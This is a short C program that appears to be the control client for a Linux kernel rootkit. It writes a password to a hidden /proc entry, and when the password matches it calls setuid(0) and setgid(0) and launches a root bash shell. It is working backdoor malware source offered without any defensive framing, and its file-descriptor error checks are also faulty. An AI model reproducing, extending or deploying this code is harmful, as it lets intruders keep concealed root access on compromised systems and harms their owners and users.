#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h>

#include "rootkit_conf.conf.h"

char file[64];
char command[64];
int root = 0;

int main(int argc, char *argv[]) {
    
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <command>\n", argv[0]);
        return 1;
    }

    int fd;
    sprintf(file, "/proc/%s", passwaiter);
    if (!strcmp(argv[1], password))
        root = 1;
    fd = open(file, O_WRONLY);
    if (fd < 1) {
        printf("Opening for writing failed! Trying to open for reading!\n");
        fd = open(file, O_RDONLY);
        if (!fd) {
            perror("open");
            return 1;
        }
        read(fd, argv[1], strlen(argv[1]));
    }
    else
        write(fd, argv[1], strlen(argv[1]));
    end:
        close(fd);
        printf("[+] I did it!\n");

        if (root) {
            uid_t uid = getuid();
            printf("[+] Success! uid=%i\n", uid);
            setuid(0);
            setgid(0);
            execl("/bin/bash", "bash", 0);
        }
        return 0;

}

